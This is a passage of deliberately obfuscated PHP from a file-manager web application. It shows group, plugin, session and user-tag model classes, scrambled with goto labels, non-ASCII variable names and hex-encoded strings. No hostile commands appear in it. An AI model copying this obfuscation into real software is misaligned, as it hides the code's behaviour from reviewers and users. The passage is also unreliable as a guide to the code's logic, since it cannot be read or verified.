$Eˆ‡ßè Î[921] => $Eˆ‡ßè Î[2096]); goto CÙÃ–ßÌÛğ; CÙÃ–ßÌÛğ: $eÒÀ‹½š‹ = $this->_makeOrder()->where($dÇÕÎ™¿Ò„)->selectPage(20); $eÒÀ‹½š‹ = $eÒÀ‹½š‹ ? $eÒÀ‹½š‹ : array(); if (!$eÒÀ‹½š‹ || count($eÒÀ‹½š‹[$Eˆ‡ßè Î[350]]) < 5 && Input::check($f¸î„æ¸½ˆ, $Eˆ‡ßè Î[303])) { $aÉ‚ÇŸàå = $this->_searchFromMeta($Eˆ‡ßè Î[411], $f¸î„æ¸½ˆ, 10); $C£Ş…  = $this->_searchFromMeta($Eˆ‡ßè Î[412], $f¸î„æ¸½ˆ, 10); $a¡®ó»ŠËÓ = array_merge($aÉ‚ÇŸàå, $C£Ş… , $eÒÀ‹½š‹[$Eˆ‡ßè Î[350]]); $eÒÀ‹½š‹[$Eˆ‡ßè Î[350]] = array_unique_by_key($a¡®ó»ŠËÓ, $Eˆ‡ßè Î[2013]); $eÒÀ‹½š‹[$Eˆ‡ßè Î[347]][$Eˆ‡ßè Î[348]] = count($eÒÀ‹½š‹[$Eˆ‡ßè Î[350]]); $eÒÀ‹½š‹[$Eˆ‡ßè Î[347]][$Eˆ‡ßè Î[349]] = ceil($eÒÀ‹½š‹[$Eˆ‡ßè Î[347]][$Eˆ‡ßè Î[348]] / $eÒÀ‹½š‹[$Eˆ‡ßè Î[347]][$Eˆ‡ßè Î[345]]); } goto B¸³¶¶ÀÆ…; Eƒãí”•ÈŞ: $Eˆ‡ßè Î =& $_SERVER[¿õñ]; $f¸î„æ¸½ˆ = $c ³Èµ‡Åã[$Eˆ‡ßè Î[2092]]; $dÕœ¤´„§ = isset($c ³Èµ‡Åã[$Eˆ‡ßè Î[2093]]) ? $c ³Èµ‡Åã[$Eˆ‡ßè Î[2093]] : !1; goto B¡°ÆÜˆù´; d‹Ê„ñ„—Å: } private function _searchFromMeta($eáš—„Æ, $B„¦¼Ûé, $fÑ‚•¹áø») { goto aî¡¾ ñä; aî¡¾ ñä: $c÷İÀ½öœ„ =& $_SERVER[¿õñ]; $B„¦¼Ûé = strtolower($B„¦¼Ûé); $c¬º‰™çÎ¡ = array($c÷İÀ½öœ„[88] => $eáš—„Æ, $c÷İÀ½öœ„[354] => array($c÷İÀ½öœ„[758], "\45{$B„¦¼Ûé}\x25")); goto E˜‚ŞĞâÅ; E˜‚ŞĞâÅ: $d±ÈòñÖÄ = Model($c÷İÀ½öœ„[2097])->where($c¬º‰™çÎ¡)->limit($fÑ‚•¹áø»)->select(); if (!$d±ÈòñÖÄ) { return array(); } $d±ÈòñÖÄ = array_to_keyvalue($d±ÈòñÖÄ, $c÷İÀ½öœ„[33], $c÷İÀ½öœ„[2013]); goto F·İ«ã¾; F·İ«ã¾: $dá¶êˆ­¿ = $this->where(array($c÷İÀ½öœ„[2088] => array($c÷İÀ½öœ„[7], $d±ÈòñÖÄ)))->select(); if (!$dá¶êˆ­¿) { return array(); } return $dá¶êˆ­¿; goto D¿©È•˜ù; D¿©È•˜ù: } protected function _listDataApplyItem($C™è¯Ø‹˜Õ) { $cò¿òÚßÜ = array($C™è¯Ø‹˜Õ); $this->_listDataApply($cò¿òÚßÜ); return $cò¿òÚßÜ[0]; } protected function _listDataApply(&$bª‡àšæò) { goto dÆóŞÏ‘†Ÿ; eò˜ƒã©„ä: $this->_listAppendParent($bª‡àšæò); $this->_listAppendSourceRoot($bª‡àšæò, $cŒù“ÑÃõ•); goto Eç‰¢¯ïğ; aÅ‹†Ï¾´ù: $this->_listAppendChildren($bª‡àšæò); $this->_listAppendChildrenMember($bª‡àšæò); $this->_listAppendMeta($bª‡àšæò, $cŒù“ÑÃõ•); goto eò˜ƒã©„ä; dÆóŞÏ‘†Ÿ: $C‰œ§¨ğ =& $_SERVER[¿õñ]; if (!$bª‡àšæò) { return; } $cŒù“ÑÃõ• = array_to_keyvalue($bª‡àšæò, $C‰œ§¨ğ[33], $C‰œ§¨ğ[2013]); goto aÅ‹†Ï¾´ù; Eç‰¢¯ïğ: } private function _listAppendChildren(&$Cµ·Ø˜ĞÉŠ) { goto bÜÛ†‡–†­; C°±¶÷ÕÇô: $AÉòÜìæ«Ô = array_to_keyvalue($AÉòÜìæ«Ô, $AÕÀ®´ç…«[446]); foreach ($Cµ·Ø˜ĞÉŠ as &$DƒëŞœ”½ì) { $DƒëŞœ”½ì[$AÕÀ®´ç…«[2098]] = isset($AÉòÜìæ«Ô[$DƒëŞœ”½ì[$AÕÀ®´ç…«[2013]] . $AÕÀ®´ç…«[2099]]); } goto Dê‡±ìİÑ„; Báù’ª¤ø¤: $eĞÈ‚•„¿È = count($Cµ·Ø˜ĞÉŠ); $Aä™ÚÚù = $this->tablePrefix . $this->tableName; for ($Fß²±Ö¥³„ = 0, $b¾±“½ªÒ = 0; $Fß²±Ö¥³„ < $eĞÈ‚•„¿È; $Fß²±Ö¥³„++) { $b¾±“½ªÒ++; $AéÊ¤ìë” = $Cµ·Ø˜ĞÉŠ[$Fß²±Ö¥³„][$AÕÀ®´ç…«[2013]]; $D´šÁÚ®ÑÌ .= "\123\x45\114\x45\x43\124\40\x2a\x20\x46\x52\x4f\115\x20\x28\x53\x45\x4c\x45\x43\x54\40\47{$AéÊ¤ìë”}\137\143\x68\151\x6c\144\47\x20\141\x73\40\150\x61\x73\40\x46\x52\x4f\115\x20\140{$Aä™ÚÚù}\x60\40\167\x68\x65\x72\x65\x20\160\141\x72\x65\156\x74\111\104\x3d{$AéÊ¤ìë”}\x20\154\151\155\151\x74\x20\61\51\x20\141\163\40\164\x62\x5f{$AéÊ¤ìë”}\x20\x75\x6e\x69\157\156\x20\x61\x6c\154\x20"; if (($b¾±“½ªÒ >= 20 || $Fß²±Ö¥³„ == $eĞÈ‚•„¿È - 1) && $D´šÁÚ®ÑÌ) { $D´šÁÚ®ÑÌ = substr($D´šÁÚ®ÑÌ, 0, -strlen($AÕÀ®´ç…«[445])); $E¹ÉÕôŠè = $this->query($D´šÁÚ®ÑÌ); $AÉòÜìæ«Ô = array_merge($AÉòÜìæ«Ô, $E¹ÉÕôŠè); $b¾±“½ªÒ = 0; $D´šÁÚ®ÑÌ = $AÕÀ®´ç…«[33]; } } goto C°±¶÷ÕÇô; bÜÛ†‡–†­: $AÕÀ®´ç…« =& $_SERVER[¿õñ]; $D´šÁÚ®ÑÌ = $AÕÀ®´ç…«[358]; $AÉòÜìæ«Ô = array(); goto Báù’ª¤ø¤; Dê‡±ìİÑ„: } private function _listAppendChildrenMember(&$A† ÑÚ»§) { goto bÊ¿œƒÃƒŞ; Aæ…øä­Â: $F„ÀÏ×Ûœƒ = count($A† ÑÚ»§); $f®³›”ö’Û = $this->tablePrefix . $aÙÒâÕ¹Î«[2090]; for ($cãÎÓ›‘ö = 0, $CÊÑù±Ï‹ = 0; $cãÎÓ›‘ö < $F„ÀÏ×Ûœƒ; $cãÎÓ›‘ö++) { $CÊÑù±Ï‹++; $F”â‘åƒº = $A† ÑÚ»§[$cãÎÓ›‘ö][$aÙÒâÕ¹Î«[2013]]; $bª´†„ãË .= "\x53\x45\114\x45\x43\124\x20\52\x20\106\x52\x4f\x4d\40\x28\123\105\x4c\x45\x43\x54\40\x27{$F”â‘åƒº}\137\x63\150\x69\x6c\x64\47\40\141\163\40\150\x61\163\x20\x46\x52\x4f\x4d\x20\140{$f®³›”ö’Û}\x60\40\167\x68\145\x72\145\40\x67\162\157\x75\160\x49\x44\x3d{$F”â‘åƒº}\x20\x6c\x69\155\x69\164\x20\x31\x29\x20\141\163\x20\x74\142\137{$F”â‘åƒº}\x20\165\156\151\157\x6e\40\141\x6c\x6c\40"; if (($CÊÑù±Ï‹ >= 20 || $cãÎÓ›‘ö == $F„ÀÏ×Ûœƒ - 1) && $bª´†„ãË) { $bª´†„ãË = substr($bª´†„ãË, 0, -strlen($aÙÒâÕ¹Î«[445])); $cİ—ˆ±Õ‚ = $this->query($bª´†„ãË); $d·×¶êéˆà = array_merge($d·×¶êéˆà, $cİ—ˆ±Õ‚); $CÊÑù±Ï‹ = 0; $bª´†„ãË = $aÙÒâÕ¹Î«[33]; } } goto e§³Í”‚®Í; bÊ¿œƒÃƒŞ: $aÙÒâÕ¹Î« =& $_SERVER[¿õñ]; $bª´†„ãË = $aÙÒâÕ¹Î«[358]; $d·×¶êéˆà = array(); goto Aæ…øä­Â; e§³Í”‚®Í: $d·×¶êéˆà = array_to_keyvalue($d·×¶êéˆà, $aÙÒâÕ¹Î«[446]); foreach ($A† ÑÚ»§ as &$F»¿Ö„”Šä) { $F»¿Ö„”Šä[$aÙÒâÕ¹Î«[2100]] = isset($d·×¶êéˆà[$F»¿Ö„”Šä[$aÙÒâÕ¹Î«[2013]] . $aÙÒâÕ¹Î«[2099]]); } goto fÌÁ•°ƒÂ¸; fÌÁ•°ƒÂ¸: } private function _listAppendMeta(&$dùŒÌÚ¿²…, $A†¾³„ğôÒ) { $Bùä¾¼‰¶ =& $_SERVER[¿õñ]; $c‰Š­ºÅ = array($Bùä¾¼‰¶[2013] => array($Bùä¾¼‰¶[7], $A†¾³„ğôÒ)); $b‚ÄáÆšÀ° = Model($Bùä¾¼‰¶[2089])->where($c‰Š­ºÅ)->select(); $b‚ÄáÆšÀ° = array_to_keyvalue_group($b‚ÄáÆšÀ°, $Bùä¾¼‰¶[2013]); foreach ($b‚ÄáÆšÀ° as &$d“ñ¹”ÊÖ) { $d“ñ¹”ÊÖ = array_to_keyvalue($d“ñ¹”ÊÖ, $Bùä¾¼‰¶[88], $Bùä¾¼‰¶[354]); } foreach ($dùŒÌÚ¿²… as &$F¾•ÖëÄ¯ä) { $F¾•ÖëÄ¯ä[$Bùä¾¼‰¶[413]] = array(); if (isset($b‚ÄáÆšÀ°[$F¾•ÖëÄ¯ä[$Bùä¾¼‰¶[2013]]])) { $F¾•ÖëÄ¯ä[$Bùä¾¼‰¶[413]] = $b‚ÄáÆšÀ°[$F¾•ÖëÄ¯ä[$Bùä¾¼‰¶[2013]]]; } } } protected function parentLevelArray($eÖÆ¥²­Ø) { $D“›‰é á¢ =& $_SERVER[¿õñ]; $eÖÆ¥²­Ø = explode($D“›‰é á¢[47], trim($eÖÆ¥²­Ø, $D“›‰é á¢[47])); $eÖÆ¥²­Ø = array_remove_value($eÖÆ¥²­Ø, $D“›‰é á¢[464]); return $eÖÆ¥²­Ø; } private function _listAppendParent(&$Dê¾Ü…ê”õ) { goto fä³ô—Ñ…; cÜØ•¤ãƒÒ: foreach ($Dê¾Ü…ê”õ as &$c“˜ÄªÄ´¥) { $eæŞÆéæ‹¢ = $this->parentLevelArray($c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[455]]); $f—·÷è©­ = $cæ²øÖŠ±‡[33]; foreach ($eæŞÆéæ‹¢ as $cÓÇ…·Ê¼¤) { $f—·÷è©­ .= $dÈ²ïÖ°Ò[$cÓÇ…·Ê¼¤] . $cæ²øÖŠ±‡[8]; } if ($eæŞÆéæ‹¢) { $f—·÷è©­ .= $c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[28]]; } $c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[459]] = str_replace($cæ²øÖŠ±‡[463], $cæ²øÖŠ±‡[8], $f—·÷è©­); } goto EôÄŸµ‚í£; fä³ô—Ñ…: $cæ²øÖŠ±‡ =& $_SERVER[¿õñ]; $dÈ²ïÖ°Ò = array(); foreach ($Dê¾Ü…ê”õ as &$c“˜ÄªÄ´¥) { $dÈ²ïÖ°Ò[$c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[2013]]] = $c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[28]]; $eæŞÆéæ‹¢ = $this->parentLevelArray($c“˜ÄªÄ´¥[$cæ²øÖŠ±‡[455]]); foreach ($eæŞÆéæ‹¢ as $cÓÇ…·Ê¼¤) { if (!isset($dÈ²ïÖ°Ò[$cÓÇ…·Ê¼¤])) { $dÈ²ïÖ°Ò[$cÓÇ…·Ê¼¤] = 0; } } } goto C ôËÕ¿ò„; C ôËÕ¿ò„: $e˜–´«ø©Æ = array(); foreach ($dÈ²ïÖ°Ò as $b¾±½—÷‘† => $Fœ›ì…ò“Ê) { if (!$Fœ›ì…ò“Ê) { $e˜–´«ø©Æ[] = $b¾±½—÷‘†; } } if ($e˜–´«ø©Æ) { $b›¨ÔöÀÉ = array($cæ²øÖŠ±‡[2088] => array($cæ²øÖŠ±‡[381], $e˜–´«ø©Æ)); $AÒÏšÇÏâ = $this->field($cæ²øÖŠ±‡[2101])->where($b›¨ÔöÀÉ)->select(); $Eë±Ó½‰¤‡ = array_to_keyvalue($AÒÏšÇÏâ, $cæ²øÖŠ±‡[2013], $cæ²øÖŠ±‡[28]); $dÈ²ïÖ°Ò = array_merge_index($dÈ²ïÖ°Ò, $Eë±Ó½‰¤‡); } goto cÜØ•¤ãƒÒ; EôÄŸµ‚í£: } private function _listAppendSourceRoot(&$C‘‰¨÷ôÏ, $F½Ïçá¬ôî) { goto Fù§‹»é”–; Fù§‹»é”–: $DÏ»†Š§îÔ =& $_SERVER[¿õñ]; $F¡»…·¸Ò¨ = array($DÏ»†Š§îÔ[368] => SourceModel::TYPE_GROUP, $DÏ»†Š§îÔ[457] => 0, $DÏ»†Š§îÔ[452] => array($DÏ»†Š§îÔ[7], $F½Ïçá¬ôî)); $FÅÒ‰‚¸à = $DÏ»†Š§îÔ[2102]; goto D¸£æ·¯Úò; D¸£æ·¯Úò: $B”Óë®ï“Î = Model($DÏ»†Š§îÔ[759])->order($DÏ»†Š§îÔ[2103])->field($FÅÒ‰‚¸à)->where($F¡»…·¸Ò¨)->select(); $B”Óë®ï“Î = array_to_keyvalue($B”Óë®ï“Î, $DÏ»†Š§îÔ[452]); $B”Óë®ï“Î = array_remove_key($B”Óë®ï“Î, $DÏ»†Š§îÔ[452]); goto fÏ‰áá«›; fÏ‰áá«›: foreach ($C‘‰¨÷ôÏ as &$e•Ï­ ª–‚) { $e•Ï­ ª–‚[$DÏ»†Š§îÔ[388]] = $B”Óë®ï“Î[$e•Ï­ ª–‚[$DÏ»†Š§îÔ[2013]]] ? $B”Óë®ï“Î[$e•Ï­ ª–‚[$DÏ»†Š§îÔ[2013]]] : array(); } goto AÊê÷‡˜Ñ–; AÊê÷‡˜Ñ–: } protected function resetParentLevel() { $eàÒƒöõÊÄ =& $_SERVER[¿õñ]; $cº¯©Àö„İ = $eàÒƒöõÊÄ[2013]; $C¶‡‰…µëß = $this->select(); $C¶‡‰…µëß = array_to_keyvalue($C¶‡‰…µëß, $cº¯©Àö„İ); foreach ($C¶‡‰…µëß as $cÕÄ§©Ìõ) { goto a÷ÜÔàøßš; e„“Ø¨ÅÕ¶: $c†ˆƒƒ‰é’[] = 0; $c†ˆƒƒ‰é’ = $eàÒƒöõÊÄ[47] . implode($eàÒƒöõÊÄ[47], array_reverse($c†ˆƒƒ‰é’)) . $eàÒƒöõÊÄ[47]; $this->setNamePinyin($cÕÄ§©Ìõ[$cº¯©Àö„İ], $cÕÄ§©Ìõ[$eàÒƒöõÊÄ[28]]); goto E›ß­©¼ŒË; E›ß­©¼ŒË: $this->where(array($cº¯©Àö„İ => $cÕÄ§©Ìõ[$cº¯©Àö„İ]))->save(array($eàÒƒöõÊÄ[518] => $c†ˆƒƒ‰é’)); goto d¥ÕÚ„¹Ó§; a÷ÜÔàøßš: $CŒ•‘íÆÙ = $cÕÄ§©Ìõ; $c†ˆƒƒ‰é’ = array(); while ($CŒ•‘íÆÙ[$eàÒƒöõÊÄ[457]] != 0) { $c†ˆƒƒ‰é’[] = $CŒ•‘íÆÙ[$eàÒƒöõÊÄ[457]]; $CŒ•‘íÆÙ = $C¶‡‰…µëß[$CŒ•‘íÆÙ[$eàÒƒöõÊÄ[457]]]; } goto e„“Ø¨ÅÕ¶; d¥ÕÚ„¹Ó§: } return $C¶‡‰…µëß; } public function groupNameAuto($Aîˆ†­ñÛ´, $A´¥ÌØ–°Í) { $a”‰êîâÍœ =& $_SERVER[¿õñ]; $E„’ÂğÌ¼ = $this->where(array($a”‰êîâÍœ[365] => $Aîˆ†­ñÛ´))->getField($a”‰êîâÍœ[28], !0); if (!$E„’ÂğÌ¼ || !in_array($A´¥ÌØ–°Í, $E„’ÂğÌ¼)) { return $A´¥ÌØ–°Í; } for ($Bš®Ò‚‚À = 1; $Bš®Ò‚‚À <= count($E„’ÂğÌ¼) + 1; $Bš®Ò‚‚À++) { $aÑš¦ŒÈä = $A´¥ÌØ–°Í . "\x28{$Bš®Ò‚‚À}\51"; if (!in_array($aÑš¦ŒÈä, $E„’ÂğÌ¼)) { return $aÑš¦ŒÈä; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x70\154\x75\147\151\x6e\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x73\x74\x61\x74\165\163", "\x72\x65\147\151\145\163\164", "\143\157\156\x66\151\x67"); public function loadList($DÖ”‹±¹æé = false) { $Fİ†ÓîÁ•« = array_to_keyvalue($this->listData(), $_SERVER[¿õñ][28]); if ($DÖ”‹±¹æé) { return $Fİ†ÓîÁ•«[$DÖ”‹±¹æé]; } return $Fİ†ÓîÁ•«; } public function init() { $D‹¬èˆ¿îŠ =& $_SERVER[¿õñ]; Hook::trigger($D‹¬èˆ¿îŠ[2104]); $AÚŒÖ­¤¦Ö = $this->loadPluginList(); foreach ($AÚŒÖ­¤¦Ö as $aÚ‚Â‚”¢– => $d¸—Şèõ¡ø) { $e’»¦õ£ä = $this->appAllow($aÚ‚Â‚”¢–, $d¸—Şèõ¡ø); if (!$e’»¦õ£ä) { continue; } foreach ($d¸—Şèõ¡ø[$D‹¬èˆ¿îŠ[2105]] as $AóÛÓç±‹² => $bæëßª‚—) { Hook::bind($AóÛÓç±‹², $bæëßª‚—); } } Hook::trigger($D‹¬èˆ¿îŠ[2106]); Hook::trigger(ACTION); } public function appAllow($d•åº³è•¬, $Dî­­…¾ºõ, $b‘¤ôî–‚ = true) { $aùøÚ¿Ùí© =& $_SERVER[¿õñ]; $DÆÈ¡£ÈÏé = PLUGIN_DIR . $d•åº³è•¬ . $aùøÚ¿Ùí©[2107]; if (!is_array($Dî­­…¾ºõ) || !is_array($Dî­­…¾ºõ[$aùøÚ¿Ùí©[2105]]) || !is_file($DÆÈ¡£ÈÏé) || $Dî­­…¾ºõ[$aùøÚ¿Ùí©[686]] != 1) { return !1; } if ($b‘¤ôî–‚ && !Action($aùøÚ¿Ùí©[2108])->checkAuth($d•åº³è•¬)) { return !1; } return !0; } public function unInstall($fª¥—Š£Ûã) { $D´õµ´íõÍ =& $_SERVER[¿õñ]; $EÁô–×Œ¶‚ = $this->loadList($fª¥—Š£Ûã); if (file_exists(PLUGIN_DIR . $fª¥—Š£Ûã)) { Hook::apply($fª¥—Š£Ûã . $D´õµ´íõÍ[2109]); } $this->remove($EÁô–×Œ¶‚[$D´õµ´íõÍ[364]]); } public function changeStatus($D­¬ƒŒÉó, $BŸ‹Ú‹±Ø×) { $CÄ¦¹‰­ƒÏ =& $_SERVER[¿õñ]; $f¯†‘½Öæ = $this->loadList($D­¬ƒŒÉó); if ($BŸ‹Ú‹±Ø×) { Hook::apply($D­¬ƒŒÉó . $CÄ¦¹‰­ƒÏ[2110]); } $this->update($f¯†‘½Öæ[$CÄ¦¹‰­ƒÏ[364]], array($CÄ¦¹‰­ƒÏ[2111] => $BŸ‹Ú‹±Ø×)); } public function appRegist($B©»ÕªØó„, $d›Ù÷ğÅ¦°) { $a«ƒƒƒ¼İß =& $_SERVER[¿õñ]; $EÎ‘™ôêì = $this->loadList($B©»ÕªØó„); if ($EÎ‘™ôêì) { $this->update($EÎ‘™ôêì[$a«ƒƒƒ¼İß[364]], array($a«ƒƒƒ¼İß[2105] => $d›Ù÷ğÅ¦°)); } else { $AÄ¤Õ‰ÏÂÖ = array($a«ƒƒƒ¼İß[28] => $B©»ÕªØó„, $a«ƒƒƒ¼İß[2105] => $d›Ù÷ğÅ¦°, $a«ƒƒƒ¼İß[686] => 0, $a«ƒƒƒ¼İß[6] => $this->getConfigDefault($B©»ÕªØó„)); $this->insert($AÄ¤Õ‰ÏÂÖ); } } public function getConfigDefault($C³ŒôèØê») { $B¿†ğ =& $_SERVER[¿õñ]; $e«ØÆô•¥ = array(); $fô¼­ƒíÄ = $this->getPackageJson($C³ŒôèØê»); if (!$fô¼­ƒíÄ && is_array($fô¼­ƒíÄ[$B¿†ğ[2112]])) { return $e«ØÆô•¥; } foreach ($fô¼­ƒíÄ[$B¿†ğ[2112]] as $eã½¹ç¡˜ => $fÌõñ–Ü Ú) { if (!isset($fÌõñ–Ü Ú[$B¿†ğ[354]]) || isset($e«ØÆô•¥[$eã½¹ç¡˜])) { continue; } $e«ØÆô•¥[$eã½¹ç¡˜] = $fÌõñ–Ü Ú[$B¿†ğ[354]]; } return $e«ØÆô•¥; } public function getPackageJson($Cƒªâ‚—‡Æ) { return Hook::apply($Cƒªâ‚—‡Æ . $_SERVER[¿õñ][2113]); } public function getConfig($B ¢ ‰±ò, $b§ï¼ŸÂÈï = false) { $Bß‘ÆÇœ­Î =& $_SERVER[¿õñ]; $CƒˆÇŞ§ñ = array(); $Bï‹ïà«­Ô = $this->loadList($B ¢ ‰±ò); if ($Bï‹ïà«­Ô && is_array($Bï‹ïà«­Ô[$Bß‘ÆÇœ­Î[6]])) { $CƒˆÇŞ§ñ = $Bï‹ïà«­Ô[$Bß‘ÆÇœ­Î[6]]; } if (!$CƒˆÇŞ§ñ || $b§ï¼ŸÂÈï) { $CƒˆÇŞ§ñ = $this->getConfigDefault($B ¢ ‰±ò); } return $CƒˆÇŞ§ñ; } public function setConfig($bº“Ô°ÄÛ, $Eó˜÷ÕŠÃ¹ = false) { goto bÇøš–”âÌ; Fœ¢¶°ºãŞ: $this->update($BáÔöçİÙ„[$F’†¯÷Ìé¥[364]], array($F’†¯÷Ìé¥[6] => $BÜ¶¾Ş—Ğì)); goto E’ŞÁ¨³‰; bÇøš–”âÌ: $F’†¯÷Ìé¥ =& $_SERVER[¿õñ]; $BáÔöçİÙ„ = $this->loadList($bº“Ô°ÄÛ); if (!$BáÔöçİÙ„) { return !1; } goto bÜÉ°¡À‘‡; bÜÉ°¡À‘‡: if ($Eó˜÷ÕŠÃ¹ == !1) { $Eó˜÷ÕŠÃ¹ = $this->getConfigDefault($bº“Ô°ÄÛ); } $BÜ¶¾Ş—Ğì = $BáÔöçİÙ„[$F’†¯÷Ìé¥[6]]; foreach ($Eó˜÷ÕŠÃ¹ as $EÚÇ‰ÑÜŠ± => $Dƒ°¯›ùìÄ) { $BÜ¶¾Ş—Ğì[$EÚÇ‰ÑÜŠ±] = is_string($Dƒ°¯›ùìÄ) ? trim($Dƒ°¯›ùìÄ) : $Dƒ°¯›ùìÄ; } goto Fœ¢¶°ºãŞ; E’ŞÁ¨³‰: } public function viewList() { goto EÒø•›İ‡»; A¹›ŒÓğåÀ: $cÀ¾—Î‚Ğ– = $this->loadPluginList(); $D³Ç‘ë‰Õ = array(); foreach ($cÀ¾—Î‚Ğ– as $B¿½ë¢Ä«¥ => $b¿«é“å‘ì) { unset($b¿«é“å‘ì[$f×ì®Üª®¡[2105]], $b¿«é“å‘ì[$f×ì®Üª®¡[6]]); $Dö’ŸÖî  = PLUGIN_DIR . $b¿«é“å‘ì[$f×ì®Üª®¡[28]] . $f×ì®Üª®¡[2107]; if (!is_file($Dö’ŸÖî )) { continue; } $AÈ¬«â¸›š = Hook::apply($b¿«é“å‘ì[$f×ì®Üª®¡[28]] . $f×ì®Üª®¡[2113]); if (is_array($AÈ¬«â¸›š)) { $D³Ç‘ë‰Õ[$B¿½ë¢Ä«¥] = array_merge($b¿«é“å‘ì, $AÈ¬«â¸›š); } } goto fÁ…º®ÌåÚ; EÒø•›İ‡»: $f×ì®Üª®¡ =& $_SERVER[¿õñ]; $cÀ¾—Î‚Ğ– = $this->loadList(); $this->pluginScan($cÀ¾—Î‚Ğ–); goto A¹›ŒÓğåÀ; fÁ…º®ÌåÚ: return $D³Ç‘ë‰Õ; goto f¥˜ÄãÒøñ; f¥˜ÄãÒøñ: } private function loadPluginList() { $d„«´ìÅ¶¬ =& $_SERVER[¿õñ]; $bß‹¾²¤¡± = $this->loadList(); if (strtolower(MOD) == $d„«´ìÅ¶¬[2114]) { $Dç¿äá§œô = $bß‹¾²¤¡±; } else { $Dç¿äá§œô = Hook::trigger($d„«´ìÅ¶¬[2115], $bß‹¾²¤¡±); if (!$Dç¿äá§œô) { die; } } return $Dç¿äá§œô; } private function pluginScan($eœÉğÙô‹õ) { $dï¥éê·™ó =& $_SERVER[¿õñ]; recursion_dir(PLUGIN_DIR, $dç»Ÿ”÷¢Ş, $FÄ‰‹õÌ‘â, 0); foreach ($dç»Ÿ”÷¢Ş as $Bºâ¶‹§Ï…) { $C½Ú”ìÕà¿ = get_path_this($Bºâ¶‹§Ï…); if (isset($eœÉğÙô‹õ[$C½Ú”ìÕà¿]) || !file_exists($Bºâ¶‹§Ï… . $dï¥éê·™ó[2116]) || !file_exists($Bºâ¶‹§Ï… . $dï¥éê·™ó[2107])) { continue; } Hook::apply($C½Ú”ìÕà¿ . $dï¥éê·™ó[2110]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x73\145\163\163\x69\157\x6e"; public function get($b†ö’¶) { $aÕ…¼…±ø¢ =& $_SERVER[¿õñ]; $dæ£ËÃäòâ = $this->where(array($aÕ…¼…±ø¢[2117] => $b†ö’¶))->find(); if (!is_array($dæ£ËÃäòâ)) { return !1; } return $dæ£ËÃäòâ[$aÕ…¼…±ø¢[689]]; } public function set($b®Õƒ÷Œ„, $a„ÆÒ‰’õ…, $eƒÓÉ”¹Ş = 3600) { $fêò‚Î“é =& $_SERVER[¿õñ]; $b˜³ôá‰‚‘ = array($fêò‚Î“é[2117] => $b®Õƒ÷Œ„, $fêò‚Î“é[2044] => $a„ÆÒ‰’õ…, $fêò‚Î“é[2118] => $eƒÓÉ”¹Ş + time()); if (Session::get($fêò‚Î“é[2119])) { $b˜³ôá‰‚‘[$fêò‚Î“é[1350]] = Session::get($fêò‚Î“é[2119]); } else { $b˜³ôá‰‚‘[$fêò‚Î“é[1350]] = 0; } if ($this->get($b®Õƒ÷Œ„)) { return $this->where(array($fêò‚Î“é[2117] => $b®Õƒ÷Œ„))->save($b˜³ôá‰‚‘); } else { return $this->add($b˜³ôá‰‚‘, array(), !0); } } public function remove($CÆ»·£ÕóŸ) { return $this->where(array($_SERVER[¿õñ][2117] => $CÆ»·£ÕóŸ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¿õñ][2120] . time())->delete(); } } goto c“öá„´å¦; EŞ«µ™›«·: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($eÉÎ…ÀÕÀæ) { $CÆöíÖµ—° =& $_SERVER[¿õñ]; return array($CÆöíÖµ—°[2369] => array(USER_ID, $CÆöíÖµ—°[2426])); } protected function listData() { $F¶…´¿Ûˆ =& $_SERVER[¿õñ]; $eŠç‘ÍÜÇ = array($F¶…´¿Ûˆ[1341] => USER_ID, $F¶…´¿Ûˆ[432] => array($F¶…´¿Ûˆ[2427], 0)); $B‡Œø¶‘ó… = $F¶…´¿Ûˆ[2428]; $aÓÈáäçÛé = $F¶…´¿Ûˆ[2429]; $BĞÖ†ù²£ = $this->field($B‡Œø¶‘ó…)->where($eŠç‘ÍÜÇ)->order($aÓÈáäçÛé)->select(); return $BĞÖ†ù²£ ? $BĞÖ†ù²£ : array(); } protected function listByTag($f„„ìµã‡) { } protected function addToTag($d¨˜½¹ÍÄŒ, $dßÈ°ÈáÂù) { $Có¾—ÍäƒË =& $_SERVER[¿õñ]; if (!Model($Có¾—ÍäƒË[2213])->listData($dßÈ°ÈáÂù) || !Model($Có¾—ÍäƒË[759])->pathInfo($d¨˜½¹ÍÄŒ)) { return !1; } $bÕÊÓ˜”ÃÂ = array($Có¾—ÍäƒË[1341] => USER_ID, $Có¾—ÍäƒË[432] => $dßÈ°ÈáÂù, $Có¾—ÍäƒË[384] => $d¨˜½¹ÍÄŒ, $Có¾—ÍäƒË[385] => $Có¾—ÍäƒË[379], $Có¾—ÍäƒË[383] => $Có¾—ÍäƒË[33], $Có¾—ÍäƒË[2017] => 0); if ($this->where($bÕÊÓ˜”ÃÂ)->find()) { return !1; } return $this->add($bÕÊÓ˜”ÃÂ); } protected function removeFromTag($aÜÌ®åÔ„İ, $b²×È£ÄØ) { $Aê…÷Óƒ¹ =& $_SERVER[¿õñ]; if (!Model($Aê…÷Óƒ¹[2213])->listData($b²×È£ÄØ) || !Model($Aê…÷Óƒ¹[759])->pathInfo($aÜÌ®åÔ„İ)) { return !1; } $bå•†ÌËé¯ = array($Aê…÷Óƒ¹[1341] => USER_ID, $Aê…÷Óƒ¹[432] => $b²×È£ÄØ, $Aê…÷Óƒ¹[385] => $Aê…÷Óƒ¹[379], $Aê…÷Óƒ¹[384] => $aÜÌ®åÔ„İ); return $this->where($bå•†ÌËé¯)->delete(); } protected function removeByTag($fƒ¾»ÁÚ) { $eàİ‰“’Ù½ =& $_SERVER[¿õñ]; if (!$fƒ¾»ÁÚ) { return !1; } $aËÊñ„ºÀ = array($eàİ‰“’Ù½[1341] => USER_ID, $eàİ‰“’Ù½[432] => $fƒ¾»ÁÚ); return $this->where($aËÊñ„ºÀ)->delete(); } protected function removeBySource($a¸´ê¼¸ñ–) { $EŒä™ê½˜’ =& $_SERVER[¿õñ]; $F‡«¹·åğè = array($EŒä™ê½˜’[1341] => USER_ID, 